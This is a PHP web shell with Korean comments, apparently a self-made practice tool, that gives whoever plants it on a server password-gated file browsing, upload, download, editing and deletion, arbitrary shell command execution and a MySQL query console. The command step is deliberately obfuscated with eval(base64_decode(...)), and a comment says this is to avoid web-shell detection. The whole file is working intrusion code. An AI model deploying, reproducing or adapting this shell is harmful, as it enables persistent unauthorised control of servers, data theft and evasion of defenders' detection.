<?php
    session_start(); // 세션 시작

    header("Content-Type: text/html; charset=UTF8");
    $mode = isset($_REQUEST["mode"]) ? $_REQUEST["mode"] : "fileBrowser";
    $path = isset($_REQUEST["path"]) ? $_REQUEST["path"] : "";
    $page = basename($_SERVER["PHP_SELF"]); //basename은 경로에서 모든 부분 다 짜르고 딱 파일명만 가져옴
    $fileName = isset($_GET["fileName"]) ? $_GET["fileName"] : "";

    $dbHost = isset($_POST["dbHost"]) ? $_POST["dbHost"] : "";
    $dbId = isset($_POST["dbId"]) ? $_POST["dbId"] : "";
    $dbPw = isset($_POST["dbPw"]) ? $_POST["dbPw"] : "";
    $dbName = isset($_POST["dbName"]) ? $_POST["dbName"] : "";
    $query = isset($_POST["query"]) ? $_POST["query"] : "";

    
    $inputPw = isset($_POST["inputPw"]) ? $_POST["inputPw"] : "";
    $accessPw = "1bbd886460827015e5d605ed44252251"; #webshell password
    $accessFlag = isset($_SESSION["accessFlag"]); #로그인을 하면 accessFlag가 y로 설정이 됨. 로그인이 되지 않으면 Null -> 로그인 유무 확인


    if(empty($path)){
        $tempFileName = basename(__FILE__); // 현재 파일명을 basename으로 가져옴 -> magic constant 미리 정의된 상수
        $tempPath = realpath(__FILE__); // 절대 경로를 가져옴.
        $path = str_replace($tempFileName, "", $tempPath); //맨 뒤에 있는 파일명을 공백으로 처리해서 진짜 경로만 가져오기
        $path = str_replace("\\", "/", $path); // 윈도우같으면 경로가 역슬래시라서 바꿔주기
    } else {
        $path = realpath($path)."/";
        $path = str_replace("\\", "/", $path);
    }

    if($accessFlag == "Y"){ //로그인 해야만 할 수 있다.

        #Mode Logic
        if($mode == "fileCreate"){
            if(empty($fileName)){
                echo "<script>alert('파일명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
                exit();
            }
            $fp = fopen($path.$fileName, "w");
            fclose($fp);
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }
        else if($mode == "dirCreate"){
            if(empty($fileName)){
                echo "<script>alert('디렉터리명이 입력되지 않았습니다.'); history.back(-1) ;</script>";
                exit();
            }

            $dirPath = $path.$fileName;
            if(is_dir($dirPath)){ // 디렉터리가 존재하는가?
                echo "<script>alert('해당 디렉터리 명이 존재합니다.');history.back(-1);</script>";
                exit();
            }
            mkdir($dirPath);
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";

        }
        else if($mode == "fileModify" && !empty($_POST["fileContents"])){
            
            $filePath = $path.$fileName;
            if(!file_exists($filePath)){
                echo "<script>alert('파일이 존재하지 않습니다.')</script>";
                exit();
            }

            $fileContents = $_POST["fileContents"];
            $fp = fopen($filePath, "w");
            fputs($fp, $fileContents, strlen($fileContents));
            fclose($fp);
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";

        }
        else if($mode == "fileDelete") {
            if(empty($fileName)) { 
                echo "<script>alert('파일명이 입력되지 않았습니다.');history.back(-1);</script>";
                exit();
            }
            $filePath = $path.$fileName;
            if(!file_exists($filePath)){
                echo "<script>alert('파일이 존재하지 않습니다.');history.back(-1);</script>";
                
                exit();
            }
            if(!unlink($filePath)) {
                echo "<script>alert('파일 삭제 실패');history.back(-1);</script>";
                exit();
            }
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }
        else if($mode == "dirDelete") {
            if(empty($fileName)) { 
                echo "<script>alert('디렉터리명이 입력되지 않았습니다.');history.back(-1);</script>";
                exit();
            }
            $dirPath = $path.$fileName;
            if(!is_dir($dirPath)){ // 디렉터리가 존재하지 않는가?
                echo "<script>alert('디렉터리가 존재하지 않습니다.');history.back(-1);</script>";
                exit();
            }
            if(!rmdir($dirPath)){
                echo "<script>alert('디렉터리 삭제 실패.');history.back(-1);</script>";
                exit();
            }
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }
        else if($mode == "fileDownload"){
            if(empty($fileName)) { 
                echo "<script>alert('파일명이 입력되지 않았습니다.');history.back(-1);</script>";
                exit();
            }

            $filePath = $path.$fileName;
            if(!file_exists($filePath)){
                echo "<script>alert('파일이 존재하지 않습니다.');history.back(-1);</script>";
                exit();
            }

            header("Content-Type: application/octet-stream"); //파일을 다운로드하게 하기 위한 컨텐트 타입
            header("Content-Disposition: attachment; fileName= \"{$fileName}\""); #배치 성향, 특성, HTTP 응답값 body값이 어떤 특징을 가지고 있는가? / 첨부파일
            // -> 이대로 가면 다운로드를 할 수 있게 함.
            header("Content-transfer-Encoding: binary"); // 인코딩

            readfile($filePath); //경로에 있는 파일을 그대로 불러옴
            exit(); //얘는 반드시 종료를 해주어야함.
        }
        else if ($mode == "fileUpload" && !empty($_FILES["file"]["tmp_name"])){ //업로드 할 떄 파일의 값들이 몇 개 있는데, tmp_name 속성값은 비어있지 않는지의 유무로 파일이 있는지 확인
            $filePath = $path.$_FILES["file"]["name"];

            if(!move_uploaded_file($_FILES["file"]["tmp_name"], $filePath)){
                echo "script>alert('파일 업로드에 실패하였습니다.');history.back(-1);</sctipt>";
                exit();
            }
            echo "<script>location.href='{$page}?mode=fileBrowser&path={$path}'</script>";
        }
        else if ($mode == "logout") {
            unset($_SESSION["accessFlag"]);
            session_destroy();
            echo "<script>location.href='{$page}'</script>";
            exit();
        }
    } else {
        if($mode == "login" && ($accessPw == md5($inputPw))){
            $_SESSION["accessFlag"] = "Y";
            echo "<script>location.href='{$page}'</script>";
            exit();
        }
    }
    
        


    # Directory List Return Function
    function getDirList($getPath) {
        $listArr = array(); 
        $handler = opendir($getPath);
        while($file = readdir($handler)) { 
            if(is_dir($getPath.$file) == "1") {  //디렉터리일 경우에만 배열에 넣기
                $listArr[] = $file;
            }
        }
        closedir($handler);
        return $listArr;
    }

    # File List Return Function
    function getFileList($getPath) {
        $listArr = array(); 
        $handler = opendir($getPath);
        while($file = readdir($handler)) { 
            if(is_dir($getPath.$file) != "1") {  //파일일 경우에만 배열에 넣기
                $listArr[] = $file;
            }
        }
        closedir($handler);
        return $listArr;
    }
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <title>Vak-kas Webshell</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap-theme.min.css">
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/js/bootstrap.min.js"></script>
    <script>
        function fileCreate() {
            var fileName = frm.createFileName.value;
            if(!fileName) { 
                alert("파일명을 입력하세요.");
                return;
            }
            location.href = "<?php echo $page ?>?mode=fileCreate&path=<?php echo $path ?>&fileName=" + fileName;
        }

        function dirCreate() {
            var fileName = frm.createFileName.value;
            if(!fileName) { 
                alert("디렉터리명을 입력하세요.");
                return;
            }
            location.href = "<?php echo $page ?>?mode=dirCreate&path=<?php echo $path ?>&fileName=" + fileName;
        }

        function fileModify(fileName) {
            location.href= "<?php echo $page ?>?mode=fileModify&path=<?php echo $path ?>&fileName=" + fileName;
        }

        function dirDelete(fileName) { 
            if(confirm(fileName + "디렉터리를 삭제하시겠습니까?") == true) { 
                location.href = "<?php echo $page ?>?mode=dirDelete&path=<?php echo $path ?>&fileName=" + fileName;
            }
        }
        function fileDelete(fileName) { 
            if(confirm(fileName + "파일을 삭제하시겠습니까?") == true) { 
                location.href = "<?php echo $page ?>?mode=fileDelete&path=<?php echo $path ?>&fileName=" + fileName;
            }
        }
        function fileDownload(fileName) {
            location.href= "<?php echo $page ?>?mode=fileDownload&path=<?php echo $path ?>&fileName=" + fileName;
        }
    </script>
</head>
<body>
<div class="container-fluid">
    <div class="row">
    <div class='col-md-2'></div>
    <div class='col-md-8'>
        <?php if($accessFlag != "Y") { ?>
            <h3>Login</h3>
            <hr>
            <form action="<?php echo $page ?>?mode=login" method="POST">
                <div class="input-group">
                    <span class="input-group-addon">Password</span>
                    <input type="password" class="form-control" placeholder = "Password Input..." name="inputPw">
                </div>
                <br>
                <p class="text-center"><button class="btn btn-default" type="submit">Auth</button></p>
            </form>

        <?php } else { ?>
        <h3>Webshell <small>Create by Vak-kas</small></h3>
        <hr>
        <ul class="nav nav-tabs">
        <li role="presentation" <?php if($mode == "fileBrowser") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileBrowser">File Browser</a></li>
        <li role="presentation" <?php if($mode == "fileUpload") echo 'class="active"'; ?>><a href="<?=$page?>?mode=fileUpload&path=<?php echo $path ?>">File Upload</a></li>
        <li role="presentation" <?php if($mode == "command") echo 'class="active"'; ?>><a href="<?=$page?>?mode=command">Command Execution</a></li>
        <li role="presentation" <?php if($mode == "db") echo 'class="active"'; ?>><a href="<?=$page?>?mode=db">DB Connector</a></li>
        <li role="presentation"><a href="<?=$page?>?mode=logout">Logout</a></li>
        </ul>
        <br>
        <?php if($mode == "fileBrowser") { ?>
            <form action="<?php echo $page?>?mode=fileBrowser" method="GET">
                <div class="input-group">
                    <span class="input-group-addon">Current Path</span>
                    <input type="text" class="form-control" placeholder = "Path Input..." name="path" value="<?php echo $path ?>">
                    <span class="input-group-btn">
                        <button class="btn btn-default" type="submit">Move</button>
                    </span>
                </div>
            </form>
            <hr>
            <div class="table-responsive">
                <table class="table table-bordered table-hover" style="table-layout: fixed; word-break : break-all;">
                    <thead>
                        <tr class="active">
                            <th style="width: 50%" class="text-center">Name</th>
                            <th style="width: 14%" class="text-center">Type</th>
                            <th style="width: 18%" class="text-center">Date</th>
                            <th style="width: 18%" class="text-center">Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <!-- 디렉터리만 출력하기 -->
                            <?php
                                $dirList = getDirList($path);
                                for($i=0;$i<count($dirList);$i++){
                                    if($dirList[$i] != ".") {
                                    $dirDate = date("Y-m-d H:i", filemtime($path.$dirList[$i]));
                            ?>
                            <td style="vertical-align: middle" class="text-primary"><b><span class="glyphicon glyphicon-folder-open" aria-hidden="true"></span>&nbsp;&nbsp;
                                <a href="<?php echo $page?>?mode=fileBrowser&path=<?php echo $path?><?php echo $dirList[$i]?>"><?php echo $dirList[$i]?></a></b></td>
                            <td style="vertical-align: middle" class="text-center"><code>Directory</code></td>
                            <td style="vertical-align: middle" class="text-center"><?php echo $dirDate ?></td>
                            <td style="vertical-align: middle" class="text-center">
                                <?php if($dirList[$i] !="..") { ?>
                                <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                    <button type="button" class="btn btn-danger" title ="Directory Delete" onclick = "dirDelete('<?php echo $dirList[$i] ?>')"><span class="glyphicon glyphicon-trash" aria-hidden"true"></span></button>
                                </div>
                                <?php } ?>
                            </td>
                        </tr>
                        <?php }
                            }
                        ?>

                        <!-- 파일 출력하기 -->
                        <?php
                            $fileList = getFileList($path);
                            for($i=0;$i<count($fileList);$i++){
                                $fileDate = date("Y-m-d H:i", filemtime($path.$fileList[$i]));
                        ?>
                            <td style="vertical-align: middle"><span class="glyphicon glyphicon-file" aria-hidden="true"></span> <?php echo $fileList[$i]?></td>
                            <td style="vertical-align: middle" class="text-center"><kbd>file</kbd></td>
                            <td style="vertical-align: middle" class="text-center"><?php echo $fileDate ?></td>
                            <td style="vertical-align: middle" class="text-center">
                                <div class="btn-group btn-group-sm" role="group" aria-label="...">
                                    <button type="button" class="btn btn-info" title = "File Download" onclick="fileDownload('<?php echo $fileList[$i] ?>')"><span class="glyphicon glyphicon-save" aria-hidden"true"></span></button>
                                    <button type="button" class="btn btn-warning" title = "File Modify" onclick="fileModify('<?php echo $fileList[$i] ?>')"><span class="glyphicon glyphicon-wrench" aria-hidden"true"></span></button>
                                    <button type="button" class="btn btn-danger" title ="File Delete" onclick="fileDelete('<?php echo $fileList[$i] ?>')"><span class="glyphicon glyphicon-trash" aria-hidden"true"></span></button>
                                </div>
                            </td>
                        </tr>
                        <?php } ?>

                    </tbody>
                </table>
            </div>
            <hr>

            <!-- 파일 생성, 디렉터리 생성하기 -->
            <form name="frm">
                <div class="input-group">
                    <input type="text" class="form-control" placeholder = "File/Directory Name Input" name="createFileName">
                    <span class="input-group-btn">
                    <button class="btn btn-default" type="button" onclick="fileCreate()">File Create</button>
                        <button class="btn btn-default" type="button" onclick = "dirCreate()" >Directory Create</button>
                    </span>
                </div>
            </form>

        <?php  } else if($mode == "fileModify") { ?>
            <?php
            if(empty($fileName)) {
                echo "<script>alert('파일명이 존재하지 않습니다.');history.back(-1);</script>";
                exit();
            }
            $filePath = $path.$fileName;
            if(!file_exists($filePath)){
                echo "<script>alert('파일명 존재하지 않습니다.');history.back(-1);</script>";
                exit();
            }
            
            $fp = fopen($filePath, "r");
            $fileSize = filesize($filePath);
            $fileContents = ($fileSize > 0) ? fread($fp, $fileSize) : "";

            fclose($fp);
            ?>

            <form action="<?php echo $page ?>?mode=fileModify&path=<?php echo $path ?>&fileName=<?php echo $fileName ?>" method="POST">
                <div class="input-group">
                    <input type="text" class="form-control" value="<?php echo $path ?><?php echo $fileName?>">
                    <span class="input-group-btn">
                        <button class="btn btn-default" type="submit">File Modify</button>
                    </span>
                </div>

                <hr>
                <textarea class="form-control" rows="20" name="fileContents"><?php echo htmlspecialchars($fileContents) ?></textarea>
            </form>
            <br>
            <p class="text-center"><button class="btn btn-default" type="button" onclick="history.back(-1);">Back</button></p>
        
        <?php  } else if($mode == "fileUpload") { ?>
            <!-- 파일 업로드 시에는 post가 맞지만, enctype까지 정해주어야함. -->
            <form action="<?php echo $page ?>?mode=fileUpload" method="POST" enctype="multipart/form-data">
                <div class="input-group">
                    <span class="input-group-addon">Upload Path</span>
                    <input type="text" class="form-control" placeholder = "Path Input..." name="path" value="<?php echo $path ?>">
                    <span class="input-group-btn">

                    </span>
                </div>
                <hr>
                <div class="form-group">
                    <label for ="exampleInputFile">파일 업로드</label>
                    <input type="file" id="exampleInputFile" name="file">
                    <p class="help-block">위의 Upload Path 경로로 업로드가 됩니다.</p>
                    <p class="text-center"><button class="btn btn-default" type="submit">File Upload</button></p>
                </div>
            </form>
        <?php  } else if($mode == "command") { ?>
            <form action="<?php echo $page ?>?mode=command" method="POST">
                <div class="input-group">
                    <span class="input-group-addon">Command</span>
                    <input type="text" class="form-control" placeholder = "Command Input..." name="command" value="<?php echo isset($_POST["command"]) ? $_POST["command"] : ''; ?>">
                    <span class="input-group-btn">
                    </span>
                </div>
                <br>
                <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></p>
            </form>
            <?php
                if(!empty($_POST["command"])){
                    echo "<hr>";
                    // $result = shell_exec($_POST["command"]); // 이 shell_exec가 있다면 웹셸임을 탐지, 난독화 필요
                    eval(base64_decode("JHJlc3VsdCA9IHNoZWxsX2V4ZWMoJF9QT1NUWyJjb21tYW5kIl0pOw==")); //base64로 난독화
                    $result = str_replace("\n", "<br>", $result);
                    // $result = iconv("CP949", "UTF-8", $result); //원래 인코딩값, 변경할 인코딩값, 대상  -> 맥북에서는 안 됨.
                    echo $result;
                }

            ?>
        <?php  } else if($mode == "db") { ?>
            <?php 
                if(empty($dbHost) || empty($dbId) || empty($dbPw) || empty($dbName)){
            ?>
            <form action="<?php echo $page ?>?mode=db" method="POST">
                <div class="input-group">
                    <span class="input-group-addon">HOST</span>
                    <input type="text" class="form-control" placeholder = "Host Input..." name="dbHost">
                    <span class="input-group-addon">ID</span>
                    <input type="text" class="form-control" placeholder = "ID Input..." name="dbId">
                    <span class="input-group-addon">PW</span>
                    <input type="password" class="form-control" placeholder = "PW Input..." name="dbPw">
                    <span class="input-group-addon">DB</span>
                    <input type="text" class="form-control" placeholder = "DB Input..." name="dbName">
                </div>
                <br>
                <p class="text-center"><button class="btn btn-default" type="submit">Connect</button></p>
            </form>

            <?php
                } 
                else { 
                    try {
                        $dbConn = new mysqli($dbHost, $dbId, $dbPw, $dbName);
                        
                        // 연결 확인
                        if ($dbConn->connect_errno) {
                            throw new Exception("DB 연결 실패: " . $dbConn->connect_error);
                        }
                    } catch (Exception $e) {
                        echo "<script>alert('DB 연결 실패'); history.back(-1);</script>";
                        exit();
                    }
            ?>
            <form action="<?php echo $page ?>?mode=db" method="POST">
                <div class="input-group">
                    <span class="input-group-addon">SQL</span>
                    <input type="text" class="form-control" placeholder = "Query Input..." name="query" value="<?php echo $query ?>">
                </div>
                <br>
                <p class="text-center"><button class="btn btn-default" type="submit">Execution</button></p>
                <input type="hidden" name="dbHost" value="<?php echo $dbHost ?>">
                <input type="hidden" name="dbId" value="<?php echo $dbId ?>">
                <input type="hidden" name="dbPw" value="<?php echo $dbPw ?>">
                <input type="hidden" name="dbName" value="<?php echo $dbName ?>">
            </form>
            <?php
                if (!empty($query)) {
                    $result = $dbConn->query($query);

                    // 쿼리 실행 결과 확인
                    if ($result === false) {
                        echo "<script>alert('쿼리 실행 실패: " . $dbConn->error . "');</script>";
                    } elseif ($result === true) {
                        echo "<p class='text-success text-center'>쿼리 실행 성공 (영향 받은 행: " . $dbConn->affected_rows . ")</p>";
                    } elseif ($result instanceof mysqli_result) {
                        $rowCnt = $result->num_rows;

                        if ($rowCnt > 0) {
                ?>
                            <table class="table table-bordered table-hover">
                                <?php
                                for ($i = 0; $i < $rowCnt; $i++) {
                                    $row = $result->fetch_assoc();
                                    if ($i == 0) {
                                        $ratio = 100 / count($row);
                                ?>
                                        <thead>
                                            <tr class="active">
                                                <?php
                                                foreach ($row as $key => $value) {
                                                ?>
                                                    <th style="width: <?php echo $ratio ?>%" class="text-center"><?php echo htmlspecialchars($key) ?></th>
                                                <?php
                                                }
                                                ?>
                                            </tr>
                                        </thead>
                                        <tbody>
                                        <?php
                                    }
                                    echo "<tr>";
                                    foreach ($row as $key => $value) {
                                        ?>
                                        <td style="vertical-align: middle" class="text-center"><?php echo htmlspecialchars($value) ?></td>
                                        <?php
                                    }
                                    echo "</tr>";
                                }
                                        ?>
                                        </tbody>
                            </table>
                <?php
                        } else {
                            echo "<p class='text-warning text-center'>쿼리 결과가 없습니다.</p>";
                        }
                        $result->free();
                    }
                }
                ?>            
            <?php } ?>
        <?php } ?>
            

        <!-- 모드 else if 구문 괄호 -->
        <?php } ?>

        <hr>
        <p class="text-muted text-center">Copyright© 2025, Vak-kas, All rights reserved.</p>
    </div>
    <div class='col-md-2'></div>
    </div>
</div>
    
</body>
</html>